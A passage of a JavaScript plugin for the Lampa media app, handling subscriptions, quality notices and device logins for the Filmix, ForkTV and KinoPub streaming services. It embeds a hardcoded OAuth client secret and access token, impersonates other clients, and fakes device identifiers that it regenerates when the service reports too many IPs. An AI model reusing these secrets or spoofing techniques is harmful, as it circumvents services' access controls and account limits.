          : function () { Modss.Subscr.showAllUserSubscriptions(user_id); };
        Lampa.Select.show({
          title: Lampa.Lang.translate('modss_voice_confirm_unsubscribe'),
          items: [{
            title: '✅ ' + Lampa.Lang.translate('modss_voice_yes_unsubscribe'),
            subtitle: subscription.voice + ' - "' + subscription.title + '"',
            confirm: true
          }, {
            title: '❌ ' + Lampa.Lang.translate('modss_voice_cancel'),
            subtitle: Lampa.Lang.translate('modss_voice_leave_subscription'),
            cancel: true
          }],
          onBack: function () {
            Lampa.Select.hide();
            done();
          },
          onSelect: function (item) {
            if (item.confirm) {
              Lampa.Loading.start(function () {
                Lampa.Loading.stop();
              });

              Modss.Subscr.network.clear();
              Modss.Subscr.network.timeout(8000);
              Modss.Subscr.network.silent(Modss.Subscr.requestApiUrl('subscr/' + subscription.movie_id + '/del'), function (data) {
                Lampa.Loading.stop();
                if (data && data.success) {
                  Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscription_removed'));
                  Lampa.Select.hide();
                  done();
                } else Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
              }, function (a, c) {
                Lampa.Loading.stop();
                console.error('Modss', 'Error removing subscription:', a, c);
                Lampa.Noty.show(Lampa.Lang.translate('modss_voice_subscribe_error'));
              }, {
                user_id: user_id,
                voice: subscription.voice,
                balancer: subscription.balancer,
                season: subscription.season
              });
            } else if (item.cancel) {
              done();
            }
          }
        });
      }
    };

    },
    checkNewMovie: function (data, releaseDate, year) {
      if (!data) return;
      
      if (data.number_of_seasons || data.first_air_date) return;
      
      if (!releaseDate || !year || year === 0) {
        this.isNotReleased = true;
        return;
      }
      
      var currentYear = new Date().getFullYear();
      
      if (year > currentYear) {
        this.isNotReleased = true;
        return;
      }
      
      var releaseTime = new Date(releaseDate).getTime();
      var currentTime = new Date().getTime();
      var daysDiff = Math.floor((currentTime - releaseTime) / (1000 * 60 * 60 * 24));

      this.isNewMovie = daysDiff < 60 && daysDiff > -30;
    },
    checkQualityNotification: function (quality) {
      if (this.isNotReleased) {
        this.showNotification('notReleased');
        return;
      }

      var lowQualityPatterns = [/camrip/i, /ts/i, /tc/i, /iptvrip/i, /cam/i, /hdts/i, /hdtc/i, /dvdscr/i];
      var isLowQuality = quality && lowQualityPatterns.some(function (pattern) {
        return pattern.test(quality);
      });
      var isGoodQuality = quality && !isLowQuality;

      if (!quality) return;

      if (isLowQuality || (this.isNewMovie && !isGoodQuality)) {
        this.showNotification('newMovie');
      }
    },
    showNotification: function (type) {
      if (this.notificationShown) return;
      this.notificationShown = true;
      
      var notifications = {
        newMovie: {
          icon: '🔥',
          text: 'full_soon_available_quality'
        },
        notReleased: {
          icon: '⏳',
          text: 'full_movie_not_released'
        }
      };
      
      var notification = notifications[type];
      if (!notification) return;
      
      Lampa.Bell.push({
        icon: '<span style="font-size: 2em;">' + notification.icon + '</span>',
        text: Lampa.Lang.translate(notification.text),
        time: 5 * 1000
      });
    }
	};
	var Filmix = {
  	network: new Lampa.Reguest(),
  	api_url: 'http://filmixapp.vip/api/v2/',
  	token: Lampa.Storage.get('filmix_token', 'aaaabbbbccccddddeeeeffffaaaabbbb'),
  	user_dev: 'app_lang=ru_RU&user_dev_apk=2.2.13&user_dev_id=' + Lampa.Utils.uid(16) + '&user_dev_name=Modss&user_dev_os=11&user_dev_vendor=Lampa&user_dev_token=',
  	useProxy: window.location.protocol === 'https:',
  	add_new: function () {
  		var user_code = '';
  		var user_token = '';
  		var modal = $('<div><div class="broadcast__text">' + Lampa.Lang.translate('filmix_modal_text') + '</div><div class="broadcast__device selector" style="text-align: center">Ожидаем код...</div><br><div class="broadcast__scan"><div></div></div></div></div>');
  		Lampa.Modal.open({
  			title: '',
  			html: modal,
  			onBack: function onBack() {
  				Lampa.Modal.close();
  				Lampa.Controller.toggle('settings_component');
  				clearInterval(ping_auth);
  			},
  			onSelect: function onSelect() {
  				Lampa.Utils.copyTextToClipboard(user_code, function () {
  					Lampa.Noty.show(Lampa.Lang.translate('filmix_copy_secuses'));
  				}, function () {
  					Lampa.Noty.show(Lampa.Lang.translate('filmix_copy_fail'));
  				});
  			}
  		});
  		ping_auth = setInterval(function () {
  			Filmix.checkPro(user_token, function (json) {
  				if (json && json.user_data) {
  					Lampa.Modal.close();
  					clearInterval(ping_auth);
  					Lampa.Noty.show('Устройство добавлено');
  					Lampa.Storage.set("filmix_token", user_token);
  					Lampa.Storage.set("filmix_log", 'true');
  					Filmix.token = user_token;
  					$('[data-name="filmix_token"] .settings-param__value').text(user_token);
  					Lampa.Controller.toggle('settings_component');
  				}
  			});
  		}, 2000);
  		this.network.clear();
  		this.network.timeout(10000);
		var dev = this.api_url + 'token_request?' + this.user_dev;
  		var requestUrl = this.useProxy ? Modss.proxy('filmix') + dev : dev;
  		this.network.quiet(requestUrl, function (found) {
  			if (found.status == 'ok') {
  				user_token = found.code;
  				user_code = found.user_code;
  				modal.find('.selector').text(user_code);
  			} else {
  				Lampa.Noty.show(found);
  			}
  		}, function (a, c) {
  			Lampa.Noty.show(Filmix.network.errorDecode(a, c) + ' - Filmix');
  		});
  	},
  	showStatus: function (ch) {
  		var status = Lampa.Storage.get("filmix_status", '{}');
  		var statuss = $('.settings-param__status', ch).removeClass('active error wait').addClass('wait');
  		var info = Lampa.Lang.translate('filmix_nodevice');
  		statuss.removeClass('wait').addClass('error');
  		if (status.login) {
  			statuss.removeClass('wait').addClass('active');
  			var foto = '<img width="30em" src="' + (status.foto.indexOf('noavatar') == -1 ? status.foto : './img/logo-icon.svg') + '"> <span style="vertical-align: middle;"><b style="font-size:1.3em;color:#FF8C00">' + status.login + '</b>';
  			if (status.is_pro || status.is_pro_plus) info = foto + ' - <b>' + (status.is_pro ? 'PRO' : 'PRO_PLUS') + '</b> ' + Lampa.Lang.translate('filter_rating_to') + ' - ' + status.pro_date + '</span>';
  			else info = foto + ' - <b>NO PRO</b> - MAX 720p</span>';
  		}
  		if (ch) $('.settings-param__descr', ch).html(info);
  		else $('.settings-param__descr:eq(0)').html(info);
  	},
  	checkPro: function (token, call, err) {
  		if (!token && typeof call == 'function') return call({});
  		this.network.clear();
  		this.network.timeout(8000);
  		token = token ? token : Lampa.Storage.get("filmix_token");
  		var url = this.api_url + 'user_profile?' + this.user_dev + token;
  		var requestUrl = this.useProxy ? Modss.proxy('filmix') + url : url;
  		this.network.silent(requestUrl, function (json) {
  		  	window.FX.max_qualitie = 480;
		  	window.FX.auth = false;
  		  	window.FX.is_max_qualitie = false;
  			if (json) {
  				if (json.user_data) {
  			    window.FX.max_qualitie = 720;
  					Lampa.Storage.set("filmix_status", json.user_data);
  					Lampa.Storage.set("filmix_log", 'true');
  					if (typeof call == 'function') call(json);
  				} else {
  					Lampa.Storage.set("filmix_status", {});
  					Lampa.Storage.set("filmix_log", 'false');
  					if (typeof call == 'function') call({});
  				}
  				if(call) Filmix.showStatus();
  			}
  		}, function (a, c) {
  			if(err) err();
  			Lampa.Noty.show(Filmix.network.errorDecode(a, c) + ' - Filmix');
  		});
  	}
  };
	var ForkTV = {
		network: new Lampa.Reguest(),
		url: 'http://no_save.forktv.me',
		forktv_id: Lampa.Storage.field('forktv_id'),
		act_forktv_id: Lampa.Storage.field('act_forktv_id'),
		user_dev: function user_dev() {
		  return 'box_client=lg&box_mac=' + this.forktv_id + '&initial=ForkXMLviewer|' + this.forktv_id + '|YAL-L41%20sdk%2029||MTY5NjUyODU3MQR=E1445|078FDD396E182CD|androidapi|0|Android-device_YAL-L41_sdk_29&platform=android-device&country=&tvp=0&hw=1.4&cors=android-device&box_user=&refresh=true';
		},
		openBrowser: function (url) {
			if (Lampa.Platform.is('tizen')) {
				var e = new tizen.ApplicationControl("https://tizen.org/appcontrol/operation/view", url);
				tizen.application.launchAppControl(e, null, function () {}, function (e) {
					Lampa.Noty.show(e);
				});
			} else if (Lampa.Platform.is('webos')) {
				webOS.service.request("luna://com.webos.applicationManager", {
					method: "launch",
					parameters: {
						id: "com.webos.app.browser",
						params: {
							target: url
						}
					},
					onSuccess: function () {},
					onFailure: function (e) {
						Lampa.Noty.show(e);
					}
				});
			} else window.open(url, '_blank');
		},
		init: function () {
			if (Lampa.Storage.get('mods_fork')) this.check_forktv('', true);
			if (this.forktv_id == 'undefined') {
				this.forktv_id = this.create_dev_id();
				Lampa.Storage.set('forktv_id', this.forktv_id);
			}
			if (this.act_forktv_id == 'undefined') {
				this.act_forktv_id = this.create__id();
				Lampa.Storage.set('act_forktv_id', this.act_forktv_id);
			}
		},
		create__id: function () {
		  var randomNum = Math.floor(Math.random() * 900000) + 100000;
			return randomNum;
		},
		create_dev_id: function () {
			var charsets, index, result;
			result = "";
			charsets = "0123456789abcdef";
			while (result.length < 12) {
				index = parseInt(Math.floor(Math.random() * 15));
				result = result + charsets[index];
			}
			return result;
		},
		copyCode: function (id) {
			Lampa.Utils.copyTextToClipboard(id, function () {
				Lampa.Noty.show(Lampa.Lang.translate('filmix_copy_secuses'));
			}, function () {
				Lampa.Noty.show(Lampa.Lang.translate('filmix_copy_fail'));
			});
		},
		cats_fork: function (json) {
			var item = [];
			var get_cach = Lampa.Storage.get('ForkTv_cat', '');
			if (!get_cach) {
				json.forEach(function (itm, i) {
				//	if (itm.title !== 'Новости' /* && itm.title !== 'IPTV'*/ ) {
						item.push({
							title: itm.title,
							url: itm.playlist_url,
							img: itm.logo_30x30,
							checkbox: true
						});
					//}
				});
			} else item = get_cach.cat;

			function select(where, a) {
				where.forEach(function (element) {
					element.selected = false;
				});
				a.selected = true;
			}

			function main() {
				Lampa.Controller.toggle('settings_component');
				var cache = Lampa.Storage.cache('ForkTv_cat', 1, {});
				var catg = [];
				item.forEach(function (a) {
					catg.push(a);
				});
				if (catg.length > 0) {
					cache = {
						cat: catg
					};
					Lampa.Storage.set('ForkTv_cat', cache);
				}
				Lampa.Controller.toggle('settings');
				Lampa.Activity.back();
				ForkTV.parse();
			}
			Lampa.Select.show({
				items: item,
				title: get_cach ? Lampa.Lang.translate('title_fork_edit_cats') : Lampa.Lang.translate('title_fork_add_cats'),
				onBack: main,
				onSelect: function onSelect(a) {
					select(item, a);
					main();
				}
			});
		},
		but_add: function () {
			if (Lampa.Storage.get('mods_fork') && Lampa.Storage.get('forktv_auth')) {
			         $('body').find('.forktv').remove();
				var forktv_button = Lampa.Menu.addButton('<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke="#ffffff" stroke-width="2" class="stroke-000000"><path d="M4.4 2h15.2A2.4 2.4 0 0 1 22 4.4v15.2a2.4 2.4 0 0 1-2.4 2.4H4.4A2.4 2.4 0 0 1 2 19.6V4.4A2.4 2.4 0 0 1 4.4 2Z"></path><path d="M12 20.902V9.502c-.026-2.733 1.507-3.867 4.6-3.4M9 13.5h6"></path></g></svg>',
					'ForkTV', function () {
						ForkTV.parse();
					});
				forktv_button.addClass('forktv');
			} else $('body').find('.forktv').remove();
		},
		updMac: function (itm) {
			clearInterval(ping_auth);
			ForkTV.forktv_id = ForkTV.create_dev_id();
			Lampa.Storage.set('forktv_id', ForkTV.forktv_id);
	
			ForkTV.act_forktv_id = ForkTV.create__id();
			Lampa.Storage.set('act_forktv_id', ForkTV.act_forktv_id);

			ForkTV.check_forktv(itm, false, true);
			Lampa.Noty.show('CODE ' + Lampa.Lang.translate('succes_update_noty'));
		},
		parse: function () {
			ForkTV.check(ForkTV.url, function (json) {
				json = json.channels;
				if (json.length === 1) ForkTV.checkAdd();
				else {
					ForkTV.but_add();
					if (Lampa.Storage.get('ForkTv_cat') !== '') {
						var get_cach = Lampa.Storage.get('ForkTv_cat');
						var itms = [];
						get_cach.cat.forEach(function (it) {
							if (it.checked) itms.push({
								title: it.title,
								playlist_url: it.url,
								logo_30x30: it.img,
								home: true
							});
						});
						if (itms.length > 0) {
							Lampa.Activity.push({
								title: 'ForkTV',
								url: {
									channels: itms
								},
								submenu: true,
								component: 'forktv',
								page: 1
							});
						} else ForkTV.cats_fork(json);
					} else ForkTV.cats_fork(json);
				}
			});
		},
		check_forktv: function (itm, ar, upd) {
			var status = $('.settings-param__status', itm).removeClass('active error wait').addClass('wait');
			this.network["native"](ForkTV.url + '?' + ForkTV.user_dev(), function (json) {
				if (json.channels.length === 1) {
					var title = json.channels[0].title;
			    	ForkTV.act_forktv_id = title;
					//console.log('modss',json)
			    	Lampa.Storage.set('act_forktv_id', ForkTV.act_forktv_id);
					if (ar) {
						Lampa.Storage.set('forktv_auth', false);
						status.removeClass('wait').addClass('error');
						$('.settings-param__descr', itm).text(Lampa.Lang.translate('filmix_nodevice'));
						$('body').find('[data-action="forktv"]').remove();
					} else {
					 	if (!upd && (title.indexOf('Много IP') >= 0 || title == 'Ошибка доступа')) {
							ForkTV.forktv_id = ForkTV.create_dev_id();
							Lampa.Storage.set('forktv_id', ForkTV.forktv_id);
						
							ForkTV.act_forktv_id = ForkTV.create__id();
							Lampa.Storage.set('act_forktv_id', ForkTV.act_forktv_id);
						}
						ForkTV.checkAdd();
						$('body').find('[data-action="forktv"]').remove();
						$('.settings [data-static="true"]:eq(1), .settings [data-static="true"]:eq(2)').hide();
						$('.settings [data-static="true"]:eq(0) .settings-param__status').removeClass('active').addClass('error');
						$('.settings [data-static="true"]:eq(0) .settings-param__descr').text(Lampa.Lang.translate('filmix_nodevice'));
					}
				} else {
					ForkTV.but_add();
					Lampa.Storage.set('forktv_auth', 'true');
					status.removeClass('wait').addClass('active');
					if (itm) {
						if (itm.text().indexOf('код') == -1 || itm.text().indexOf('code') == -1) $('.settings-param__descr', itm).html('<img width="30em" src="./img/logo-icon.svg"> <b style="vertical-align: middle;font-size:1.4em;color:#FF8C00">' + Lampa.Lang.translate('account_authorized') + '</b>');
						if (itm.find('.settings-param__name').text().indexOf('раздел') > -1 || itm.find('.settings-param__name').text().indexOf('Sections') > -1) ForkTV.cats_fork(json.channels);
					}
				}
			}, function (e) {
				if (ar) {
					Lampa.Storage.set('forktv_auth', 'false');
					status.removeClass('wait').addClass('error');
					$('.settings-param__descr', itm).text(Lampa.Lang.translate('filmix_nodevice'));
					$('body').find('[data-action="forktv"]').remove();
				} else {
					ForkTV.checkAdd();
					$('body').find('[data-action="forktv"]').remove();
					$('.settings [data-static="true"]:eq(0) .settings-param__status').removeClass('active').addClass('error');
					$('.settings [data-static="true"]:eq(0) .settings-param__descr').text(Lampa.Lang.translate('filmix_nodevice'));
					$('.settings [data-static="true"]:eq(1), .settings [data-static="true"]:eq(2)').hide();
				}
			}, false, {
				dataType: 'json'
			});
		},
		checkAdd: function () {
  			var enabled = Lampa.Controller.enabled().name;
			ForkTV.check(ForkTV.url, function (json) {
				var modal = '';
				var title = json.channels[0].title;
				if (title.indexOf('Много') >=0) {
					clearInterval(ping_auth);
					var dat = json.channels[0].description || '<img src="'+json.channels[0].logo_30x30+'">'
					modal = $('<div><div class="broadcast__text" style="text-align:left">' + dat + '</div></div></div>');
				} else {
					var match = json.channels[0].description.match(/> (\d+)</);
					var id = match ? match[1] : null;
					ForkTV.act_forktv_id = id;
					modal = $('<div><div class="broadcast__text" style="text-align:left">' + Lampa.Lang.translate('fork_auth_modal_title') + '</div><div class="broadcast__device selector" style="background-color:#fff;color:#000;text-align: center">' + ForkTV.act_forktv_id + '</div></div><br><div class="broadcast__scan"><div></div></div><br><div class="broadcast__text">' + Lampa.Lang.translate('fork_modal_wait') + '</div></div>');
				}
				Lampa.Modal.open({
					title: title,
					html: modal,
					size: 'small',
					mask: true,
					onBack: function onBack() {
						clearInterval(ping_auth);
						Lampa.Modal.close();
						Lampa.Controller.toggle(enabled);
					},
					onSelect: function onSelect() {
						ForkTV.copyCode(ForkTV.act_forktv_id);
					}
				});
				if (!Lampa.Platform.tv()) {
					setTimeout(function () {
						if (ForkTV.act_forktv_id) ForkTV.copyCode(ForkTV.act_forktv_id);
					}, 1000);
				}
				modal.find('a').on('click', function () {
					ForkTV.openBrowser('http://forktv.me');
				});
			});
			
			ping_auth = setInterval(function () {
				ForkTV.check(ForkTV.url, function (json) {
					Lampa.Modal.close();
					clearInterval(ping_auth);
					if (enabled == 'settings_component') Lampa.Activity.back();
					Lampa.Controller.toggle(enabled);
					Lampa.Storage.set('forktv_auth', 'true');
					ForkTV.parse();
				}, true);
			}, 5000);
		},
		check: function (url, call, ar) {
			this.network.clear();
			this.network.timeout(8000);
			this.network["native"](url + '?' + ForkTV.user_dev(), function (json) {
				if (json) {
				  	if (ar && json.channels.length > 1) {
						if (call) call(json);
					} else if (!ar) call(json);
					else if(json.channels[0].title.indexOf('Много IP') >= 0) {
					 	Lampa.Modal.title(json.channels[0].title);
						Lampa.Modal.update($('<div><div class="broadcast__text" style="text-align:left">' + json.channels[0].description + '</div></div></div>'));
						clearInterval(ping_auth);
					}
				}
			}, function (a, c) {
				Lampa.Noty.show(ForkTV.network.errorDecode(a, c));
			});
		}
	};
	var Pub = {
  	network: new Lampa.Reguest(),
  	baseurl: 'https://api.service-kp.com/',//api.apweb.vip/',api.srvkp.com
  	tock: 'wt7ytq2upkbxoo2w84xtcciu550ll2b1',
  	token: Lampa.Storage.get('pub_access_token', 'wt7ytq2upkbxoo2w84xtcciu550ll2b1'),
  	openBrowser: function (url) {
  		if (Lampa.Platform.is('tizen')) {
  			var e = new tizen.ApplicationControl("http://tizen.org/appcontrol/operation/view", url);
  			tizen.application.launchAppControl(e, null, function (r) {}, function (e) {
  				Lampa.Noty.show(e);
  			});
  		} else if (Lampa.Platform.is('webos')) {
  			webOS.service.request("luna://com.webos.applicationManager", {
  				method: "launch",
  				parameters: {
  					id: "com.webos.app.browser",
  					params: {
  						target: url
  					}
  				},
  				onSuccess: function () {},
  				onFailure: function (e) {
  					Lampa.Noty.show(e);
  				}
  			});
  		} else window.open(url, '_blank');
  	},
  	Auth_pub: function () {
  		Pub.network.silent(Pub.baseurl + 'oauth2/device', function (json) {
  			Lampa.Storage.set('pub_user_code', json.user_code);
  			Lampa.Storage.set('pub_code', json.code);
  			Pub.checkAdd();
  		}, function (a, c) {
  			Lampa.Noty.show('Авторизация ' + Pub.network.errorDecode(a, c) + ' - KinoPub');
  		}, {
  			'grant_type': 'device_code',
  			'client_id': 'xbmc',
  			'client_secret': 'cgg3gtifu46urtfp2zp1nqtba0k2ezxh'
  		});
  	},
  	checkAdd: function () {
  		var modal = $('<div><div class="broadcast__text">' + Lampa.Lang.translate('pub_modal_title') + '</div><br><div class="broadcast__scan"><div></div></div><div class="broadcast__device selector" style="background-color:#fff;color:#000;text-align: center"><div class="broadcast__text"><b style="font-size:1em">' + Lampa.Lang.translate('pub_title_wait') + '</b></div></div>');
  		Lampa.Modal.open({
  			title: '',
  			html: modal,
  			size: 'small',
  			mask: true,
  			onBack: function onBack() {
  				Lampa.Modal.close();
  				clearInterval(ping_auth);
  				Lampa.Controller.toggle('settings_component');
  			},
  			onSelect: function onSelect() {
  				if (!Lampa.Platform.tv()) {
  					Lampa.Utils.copyTextToClipboard(Lampa.Storage.get('pub_user_code'), function () {
  						Lampa.Noty.show(Lampa.Lang.translate('filmix_copy_secuses'));
  					}, function () {
  						Lampa.Noty.show(Lampa.Lang.translate('filmix_copy_fail'));
  					});
  				} else Pub.openBrowser('http://kino.pub');
  			}
  		});
  		modal.find('a').on('click', function () {
  			Pub.openBrowser('http://kino.pub');
  		});
  		modal.find('.selector').text(Lampa.Storage.get('pub_user_code'));
  		var check = function check(url, call) {
  			Pub.network.clear();
  			Pub.network.timeout(8000);
  			Pub.network.silent(url, function (json) {
  				Lampa.Storage.set('pub_access_token', json.access_token);
  				Lampa.Storage.set('pub_refresh_token', json.refresh_token);
  				Pub.token = Lampa.Storage.get('pub_access_token');
				var ua = navigator.userAgent.match(/\(([^)]+)\)/i);
                var uas = ua ? ua[1].split(';') : [];
  				Pub.network.silent(Pub.baseurl + 'v1/device/info?access_token=' + json.access_token, function (json) {
  					Pub.network.silent(Pub.baseurl + 'v1/device/notify?access_token=' + Pub.token, function (json) {
  						if (call) call();
  					}, function (a, c) {
  						Lampa.Noty.show(Pub.network.errorDecode(a, c) + ' - KinoPub');
  					}, {
  						'title': Lampa.Platform.is('android') ? 'KinoPub Android-Lampa' : uas.length > 3 ? 'Kinopub TV-Lampa' : (uas[0] + ' ' + Lampa.Platform.get().toUpperCase()),
  						'hardware': Lampa.Platform.is('android') ? 'Android 10' : uas[2],
  						'software': Lampa.Platform.is('android') ? 'Android' : uas.length > 3 ? uas[1] : uas[0]
  					});
  				});
  			}, false, {
  				'grant_type': 'device_token',
  				'client_id': 'xbmc',
  				'client_secret': 'cgg3gtifu46urtfp2zp1nqtba0k2ezxh',
  				'code': Lampa.Storage.get('pub_code')
  			});
  		};
  		ping_auth = setInterval(function () {
  			check(Pub.baseurl + 'oauth2/device', function () {
  				clearInterval(ping_auth);
  				Lampa.Modal.close();
  				Lampa.Storage.set('logined_pub', 'true');
  				Lampa.Settings.update();
  			});
  		}, 5000);
  	},
  	refreshTok: function () {
  		this.network.silent(Pub.baseurl + 'oauth2/token', function (json) {
  			Lampa.Storage.set('pub_access_token', json.access_token);
  			Lampa.Storage.set('pub_refresh_token', json.refresh_token);
  			Pub.token = Lampa.Storage.get('pub_access_token');
  			Lampa.Noty.show('ТОКЕН обновлён');
  		}, function (a, c) {
  			Lampa.Noty.show(Pub.network.errorDecode(a, c) + ' - KinoPub');
  		}, {
  			'grant_type': 'refresh_token',
  			'refresh_token': Lampa.Storage.get('pub_refresh_token'),
  			'client_id': 'xbmc',
  			'client_secret': 'cgg3gtifu46urtfp2zp1nqtba0k2ezxh'
  		});
  	},
  	userInfo: function (itm, ur) {
  		var status = $('.settings-param__status', itm).removeClass('active error wait').addClass('wait');
  		if (!Pub.token) status.removeClass('wait').addClass('error');
  		else {
  			this.network.silent(Pub.baseurl + 'v1/user?access_token=' + Pub.token, function (json) {
				  $('.settings-param__' + (!ur ? 'name' : 'descr'), itm).html('<img width="30em" src="' + json.user.profile.avatar + '">  <span style="vertical-align: middle;"><b style="font-size:1.4em;color:#FF8C00">' + json.user.username + '</b> - ' + (json.user.username.indexOf('MODSS') == -1 ? (Lampa.Lang.translate('pub_title_left_days') + '<b>' + json.user.subscription.days + '</b> ' + Lampa.Lang.translate('pub_title_left_days_d')) : 'free') + '</span>');
  				if(json.user.username.indexOf('MODSS') == -1) {
  					$('.settings-param__' + (!ur ? 'descr' : ''), itm).html(Lampa.Lang.translate('pub_title_regdate') + ' ' + Lampa.Utils.parseTime(json.user.reg_date * 1000).full + '<br>' + (json.user.subscription.active ? Lampa.Lang.translate('pub_date_end_pro') + ' ' + Lampa.Utils.parseTime(json.user.subscription.end_time * 1000).full : '<b style="color:#cdd419">' + Lampa.Lang.translate('pub_title_not_pro') + '</b>'));
				}
				// else $('.settings-param__' + (!ur ? 'name' : 'descr'), itm).html(Lampa.Lang.translate('filmix_nodevice'))
				status.removeClass('wait').addClass('active');
  				Lampa.Storage.set('logined_pub', 'true');
  				Lampa.Storage.set('pro_pub', json.user.subscription.active);
  			}, function (a, c) {
				$('.settings-param__' + (!ur ? 'name' : 'descr'), itm).html(Lampa.Lang.translate('filmix_nodevice'));
  				status.removeClass('wait').addClass('error');
  				Lampa.Storage.set('pro_pub', 'false');
  				Lampa.Storage.set('pub_access_token', '');
  				Lampa.Storage.set('logined_pub', 'false');
  				Pub.token = Lampa.Storage.get('pub_access_token', Pub.tock);
  				//Pub.userInfo(itm, ur);
  			});
  		}
  	},
  	info_device: function () {
  		this.network.silent(Pub.baseurl + 'v1/device/info?access_token=' + Pub.token, function (json) {
  			var enabled = Lampa.Controller.enabled().name;
  			var opt = json.device.settings;
  			var subtitle = {
  				supportSsl: {
  					title: 'Использовать SSL (https) для картинок и видео'
  				},
  				supportHevc: {
  					title: 'HEVC или H.265 — формат Видеосжатия с применением более эффективных алгоритмов по сравнению с H.264/AVC. Убедитесь, что ваше устройство поддерживает Данный формат.'
  				},
  				support4k: {
  					title: '4K или Ultra HD - фильм в сверхвысокой чёткости 2160p. Убедитесь, что ваше устройство и ТВ, поддерживает данный формат.'
  				},
  				mixedPlaylist: {
  					title: 'Плейлист с AVC и HEVC потоками. В зависимости от настроек, устройство будет автоматически проигрывать нужный поток. Доступно только для 4К - фильмов. Убедитесь, что ваше устройство поддерживает данный формат плейлиста.'
  				},
  				HTTP: {
  					title: 'Неадаптивный, качество через настройки (Настройки > плеер > качество видео), все аудио, нет сабов.'
  				},
  				HLS: {
  					title: 'Неадаптивный, качество через настройки, одна аудиодорожка, нет сабов.'
  				},
  				HLS2: {
  					title: 'Адаптивный, качество автоматом, одна аудиодорожка, нет сабов.'
  				},
  				HLS4: {
  					title: 'Рекомендуется! - Адаптивный, качество автоматом, все аудио, сабы.'
  				}
  			};
  			var item = [{
  				title: 'Тип потока',
  				value: opt.streamingType,
  				type: 'streamingType'
  			}, {
  				title: 'Переключить сервер',
  				value: opt.serverLocation,
  				type: 'serverLocation'
  			}];
  			Lampa.Arrays.getKeys(opt).forEach(function (key) {
  				var k = opt[key];
  				if (!k.type && ['supportHevc', 'support4k'].indexOf(key) > - 1) item.push({
  					title: k.label,
  					value: k.value,
  					type: key,
  					subtitle: subtitle[key] && subtitle[key].title,
  					checkbox: k.type ? false : true,
  					checked: k.value == 1 ? true : false
  				});
  			});
  
  			function main(type, value) {
  				var edited = {};
  				item.forEach(function (a) {
  					if (a.checkbox) edited[a.type] = a.checked ? 1 : 0;
  				});
  				if (type) edited[type] = value;
  				Pub.network.silent(Pub.baseurl + 'v1/device/' + json.device.id + '/settings?access_token=' + Pub.token, function (json) {
  					Lampa.Noty.show(Lampa.Lang.translate('pub_device_options_edited'));
  					Lampa.Controller.toggle(enabled);
  				}, function (a, c) {
  					Lampa.Noty.show(Pub.network.errorDecode(a, c) + ' - KinoPub');
  				}, edited);
  			}
  			Lampa.Select.show({
  				items: item,
  				title: Lampa.Lang.translate('pub_device_title_options'),
  				onBack: main,
  				onSelect: function (i) {
  					var serv = [];
  					i.value.value.forEach(function (i) {
  						serv.push({
  							title: i.label,
  							value: i.id,
  							subtitle: subtitle[i.label] && subtitle[i.label].title,
  							selected: i.selected
  						});
  					});
  					Lampa.Select.show({
  						items: serv,
  						title: i.title,
  						onBack: main,
  						onSelect: function (a) {
  							main(i.type, a.value);
  						}
  					});
  				}
  			});
  		}, function (a, c) {
  			Lampa.Noty.show(Pub.network.errorDecode(a, c));
  		});
  	},
  	delete_device: function (call) {
  		this.network.silent(Pub.baseurl + 'v1/device/unlink?access_token=' + Pub.token, function (json) {
  			Lampa.Noty.show(Lampa.Lang.translate('pub_device_dell_noty'));
  			Lampa.Storage.set('logined_pub', 'false');
  			Lampa.Storage.set('pub_access_token', '');
			Lampa.Storage.set('pro_pub', 'false');
  			Pub.token = Lampa.Storage.get('pub_access_token', Pub.tock);
  			if (call) call();
  		}, function (a, c) {
  			Lampa.Noty.show(Lampa.Lang.translate('pub_device_dell_noty'));
  			Lampa.Storage.set('logined_pub', 'false');
  			Lampa.Storage.set('pub_access_token', '');
			Lampa.Storage.set('pro_pub', 'false');
  			Pub.token = Lampa.Storage.get('pub_access_token', Pub.tock);
  			if (call) call();
  			Lampa.Noty.show(Pub.network.errorDecode(a, c) + ' - KinoPub');
  		}, {});
  	}
  };
  	function startsWith(str, searchString) {
  return str.lastIndexOf(searchString, 0) === 0;
}

function endsWith(str, searchString) {
  var start = str.length - searchString.length;
  if (start < 0) return false;
  return str.indexOf(searchString, start) === start;
}

function component(object) {
  var network = new Lampa.Reguest();
  var scroll = new Lampa.Scroll({
    mask: true,
    over: true
  });

  var allItemsToDisplay = [];
  var allRenderedItems = [];
  var seasonGroups = [];
  var page = 0;
  var last = false;
  var isLoadingMore = false;
  var targetScrollElement = false;
  
  var items_need_add = [];
  var added = 0;
  var BATCH_SIZE = 10;
  var shouldLoadToLastWatched = false;
  
  scroll.onEnd = function () {
    var choice = _self.getChoice();
    if (choice.season === -1 && !isLoadingMore) {
      _self.next();
    } else if (choice.season !== -1 && added < items_need_add.length) {
      _self.loadMoreItems();
    }
  };

  var files = new Lampa.Explorer(object);
  var filter = new Lampa.Filter(object);
  var sources = {};
  var extract = {};
  var last;
  var source;
  var balanser;
  var initialized;
  var balanser_timer;
  var images = [];
  var number_of_requests = 0;
  var number_of_requests_timer;
  var balancer_cache_empty_retries = 0;
  var balancer_cache_empty_timer;
  var life_wait_times = 0;
  var life_wait_timer;
  var back_url;
  var checkH = 0;
  var last_request_url = '';
  var filter_sources = {};
  var finalItems = [];
  var localBal = ['videocdn', 'cdnmovies'];
  var currentPlayItem = null;
  var filter_translate = {
    season: Lampa.Lang.translate('torrent_serial_season'),
    voice: Lampa.Lang.translate('torrent_parser_voice'),
    source: Lampa.Lang.translate('settings_rest_source')
  };
  
  // Кеш для источников
  var sourcesCache = null;
  var sourcesCacheTime = 0;
  var CACHE_LIFETIME = 5 * 60 * 1000; // 5 минут
  
  // Кеш данных источников
  var sourcesData = null;
  var filterSources = null;
  var filter_find = {
    season: [],
    voice: [],
    server: [],
    type: []
  };
  var _self = this;
  var filterSelectItems = [];
  this.initialize = function () {
    var _this = this;
    this.loading(true);
    balanser = this.getLastChoiceBalanser();
    var show_filter = object.movie.number_of_seasons || (extract && extract.season && extract.season.length) || balanser == 'pub' || balanser == 'bazon' || balanser == 'hdrezka';

    if (Lampa.Manifest.app_version >= '2.3.5' && (!object.movie.number_of_seasons && (extract && !extract.season)) && Lampa.Activity.active().component == 'modss_online') {
      Lampa.Select.listener.follow('fullshow', function (a) {
        if (a.active.items.find(function (e) { return e.ismods }) && a.active.title == Lampa.Lang.translate('player_playlist')) a.html.find('.selectbox__title').html(Lampa.Lang.translate('modss_voice_tracks'));
      });
    }

